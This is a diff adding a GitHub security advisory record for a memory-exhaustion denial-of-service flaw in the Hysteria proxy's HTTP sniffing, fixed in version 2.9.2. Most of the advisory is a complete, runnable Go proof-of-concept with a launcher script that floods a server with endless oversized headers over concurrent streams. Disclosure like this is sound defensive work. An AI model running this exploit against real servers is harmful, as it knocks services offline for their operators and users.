@@ -1,0 +1,42 @@
+{
+  "id": "GHSA-jqc5-2p7q-fqfc",
+  "modified": "2026-06-26T20:30:09.658418211Z",
+  "published": "2026-06-26T20:19:01Z",
+  "summary": "Hysteria: http large header with sniff cause server DoS",
+  "details": "### Summary\n\nSending an excessively large header by an attacker could lead to a server-side DoS attack.\n\n### Details\nThe current sniff implementation does not explicitly specify the upper limit for HTTP headers. Attackers can continuously send excessively large headers without including \\r\\n\\r\\n, leading to ServerDoS and OutOfMemory errors.\n\n### PoC\n\nserver.yaml\n```\nlisten: 127.0.0.1:8443\n\ntls:\n  cert: poc_server.crt\n  key: poc_server.key\n\nauth:\n  type: password\n  password: sniff-poc-password\n\nsniff:\n  enable: true\n  timeout: 10s\n  rewriteDomain: false\n  tcpPorts: 80\n\nmasquerade:\n  type: string\n  string:\n    content: nope\n    statusCode: 404\n```\n\npoc.sh\n```\n#!/bin/bash\ngo build poc_sniff_http_dos.go\n./poc_sniff_http_dos \\\n    --server 127.0.0.1:8443 \\\n    --auth sniff-poc-password \\\n    --insecure \\\n    --target-host 192.0.2.1 \\\n    --target-port 80 \\\n    --connections 16 \\\n    --header-bytes 838860800 \\\n    --linger 12\n```\n\npoc.go\n```\n//go:build poc\n\npackage main\n\nimport (\n\t\"crypto/sha256\"\n\t\"crypto/x509\"\n\t\"encoding/hex\"\n\t\"errors\"\n\t\"flag\"\n\t\"fmt\"\n\t\"net\"\n\t\"strings\"\n\t\"sync\"\n\t\"time\"\n\n\tcoreclient \"github.com/apernet/hysteria/core/v2/client\"\n\t\"github.com/apernet/hysteria/extras/v2/obfs\"\n)\n\ntype attackConnFactory struct {\n\tobfuscator obfs.Obfuscator\n}\n\nfunc (f *attackConnFactory) New(_ net.Addr) (net.PacketConn, error) {\n\tconn, err := net.ListenUDP(\"udp\", nil)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tif f.obfuscator == nil {\n\t\treturn conn, nil\n\t}\n\treturn obfs.WrapPacketConn(conn, f.obfuscator), nil\n}\n\nfunc buildHeaderPayload(totalBytes, chunkSize int) []byte {\n\tprefix := []byte(\"GET / HTTP/1.1\\r\\nHost: victim\\r\\nUser-Agent: hy2-sniff-poc\\r\\n\")\n\tif totalBytes \u003c= len(prefix) {\n\t\treturn prefix[:totalBytes]\n\t}\n\tout := make([]byte, 0, totalBytes)\n\tout = append(out, prefix...)\n\tlinePayload := chunkSize - 32\n\tif linePayload \u003c 64 {\n\t\tlinePayload = 64\n\t}\n\tfor i := 0; len(out) \u003c totalBytes; i++ {\n\t\tline := fmt.Sprintf(\"X-Fill-%06d: %s\\r\\n\", i, strings.Repeat(\"A\", linePayload))\n\t\tremain := totalBytes - len(out)\n\t\tif len(line) \u003e remain {\n\t\t\tline = line[:remain]\n\t\t}\n\t\tout = append(out, line...)\n\t}\n\t// 故意不追加最后一个空行 \\r\\n，迫使服务端在 sniff timeout 内持续读 header。\n\treturn out\n}\n\nfunc makeClient(server, auth, sni string, insecure bool, pinSHA256, salamanderPSK string) (coreclient.Client, error) {\n\tserverAddr, err := net.ResolveUDPAddr(\"udp\", server)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tcfg := \u0026coreclient.Config{\n\t\tConnFactory: \u0026attackConnFactory{},\n\t\tServerAddr:  serverAddr,\n\t\tAuth:        auth,\n\t\tTLSConfig: coreclient.TLSConfig{\n\t\t\tInsecureSkipVerify: insecure,\n\t\t},\n\t}\n\thost, _, err := net.SplitHostPort(server)\n\tif err == nil \u0026\u0026 sni == \"\" \u0026\u0026 net.ParseIP(host) == nil {\n\t\tcfg.TLSConfig.ServerName = host\n\t}\n\tif sni != \"\" {\n\t\tcfg.TLSConfig.ServerName = sni\n\t}\n\tif pinSHA256 != \"\" {\n\t\tnHash := strings.ToLower(strings.ReplaceAll(pinSHA256, \":\", \"\"))\n\t\tcfg.TLSConfig.VerifyPeerCertificate = func(rawCerts [][]byte, _ [][]*x509.Certificate) error {\n\t\t\tif len(rawCerts) == 0 {\n\t\t\t\treturn errors.New(\"no peer certificate\")\n\t\t\t}\n\t\t\th := sha256.Sum256(rawCerts[0])\n\t\t\tif hex.EncodeToString(h[:]) == nHash {\n\t\t\t\treturn nil\n\t\t\t}\n\t\t\treturn errors.New(\"no certificate matches the pinned hash\")\n\t\t}\n\t}\n\tif salamanderPSK != \"\" {\n\t\tob, err := obfs.NewSalamanderObfuscator([]byte(salamanderPSK))\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\tcfg.ConnFactory = \u0026attackConnFactory{obfuscator: ob}\n\t}\n\tc, _, err := coreclient.NewClient(cfg)\n\treturn c, err\n}\n\nfunc worker(id int, c coreclient.Client, target string, payload []byte, sendChunk int, linger time.Duration, results []string) {\n\tconn, err := c.TCP(target)\n\tif err != nil {\n\t\tresults[id] = fmt.Sprintf(\"worker=%d dial error=%v\", id, err)\n\t\treturn\n\t}\n\tdefer conn.Close()\n\t_ = conn.SetWriteDeadline(time.Now().Add(linger))\n\tsent := 0\n\tfor sent \u003c len(payload) {\n\t\tend := sent + sendChunk\n\t\tif end \u003e len(payload) {\n\t\t\tend = len(payload)\n\t\t}\n\t\tn, err := conn.Write(payload[sent:end])\n\t\tif err != nil {\n\t\t\tresults[id] = fmt.Sprintf(\"worker=%d partial_sent=%d error=%v\", id, sent, err)\n\t\t\treturn\n\t\t}\n\t\tsent += n\n\t}\n\ttime.Sleep(linger)\n\tresults[id] = fmt.Sprintf(\"worker=%d sent=%d\", id, sent)\n}\n\nfunc main() {\n\tserver := flag.String(\"server\", \"\", \"Hysteria server address, e.g. 1.2.3.4:443\")\n\tauth := flag.String(\"auth\", \"\", \"Hysteria auth string/password\")\n\tsni := flag.String(\"sni\", \"\", \"optional TLS SNI\")\n\tinsecure := flag.Bool(\"insecure\", false, \"skip TLS verification\")\n\tpinSHA256 := flag.String(\"pin-sha256\", \"\", \"optional pinned server cert SHA256\")\n\tsalamanderPSK := flag.String(\"obfs-salamander-password\", \"\", \"optional salamander obfs password\")\n\ttargetHost := flag.String(\"target-host\", \"192.0.2.1\", \"must usually be an IP so sniff.Check() runs when rewriteDomain=false\")\n\ttargetPort := flag.Int(\"target-port\", 80, \"target port that should be covered by server sniff.tcpPorts\")\n\tconnections := flag.Int(\"connections\", 16, \"number of concurrent Hysteria TCP streams\")\n\theaderBytes := flag.Int(\"header-bytes\", 8*1024*1024, \"bytes of incomplete HTTP header per stream\")\n\tbuildChunk := flag.Int(\"build-chunk\", 8192, \"approximate size of generated filler header lines\")\n\tsendChunk := flag.Int(\"send-chunk\", 64*1024, \"bytes written per conn.Write call\")\n\tlingerSec := flag.Float64(\"linger\", 12, \"seconds to keep each stream open after writing\")\n\tflag.Parse()\n\n\tif *server == \"\" || *auth == \"\" {\n\t\tpanic(\"--server and --auth are required\")\n\t}\n\tif !*insecure \u0026\u0026 *pinSHA256 == \"\" {\n\t\tpanic(\"provide one of: --insecure / --pin-sha256\")\n\t}\n\n\tpayload := buildHeaderPayload(*headerBytes, *buildChunk)\n\ttarget := net.JoinHostPort(*targetHost, fmt.Sprintf(\"%d\", *targetPort))\n\tlinger := time.Duration(*lingerSec * float64(time.Second))\n\n\tfmt.Printf(\"[*] server=%s target=%s streams=%d payload=%d\\n\", *server, target, *connections, len(payload))\n\n\tc, err := makeClient(*server, *auth, *sni, *insecure, *pinSHA256, *salamanderPSK)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tdefer c.Close()\n\n\tresults := make([]string, *connections)\n\tvar wg sync.WaitGroup\n\tstart := time.Now()\n\tfor i := 0; i \u003c *connections; i++ {\n\t\twg.Add(1)\n\t\tgo func(i int) {\n\t\t\tdefer wg.Done()\n\t\t\tworker(i, c, target, payload, *sendChunk, linger, results)\n\t\t}(i)\n\t}\n\n\twg.Wait()\n\tfmt.Printf(\"[*] elapsed=%s\\n\", time.Since(start).Round(time.Millisecond))\n\tfor _, line := range results {\n\t\tfmt.Printf(\"    %s\\n\", line)\n\t}\n\tfmt.Println(\"[+] sent incomplete oversized HTTP headers; check server-side memory / stability\")\n}\n\n```\n### Impact\n\nTesting showed that the server side used a maximum of 16GB.\n\nServer memory DoS and may cause OOM.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/apernet/hysteria",
+        "purl": "pkg:golang/github.com/apernet/hysteria"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.9.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-jqc5-2p7q-fqfc/GHSA-jqc5-2p7q-fqfc.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/apernet/hysteria/security/advisories/GHSA-jqc5-2p7q-fqfc"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/apernet/hysteria"
+    }
+  ]
+}
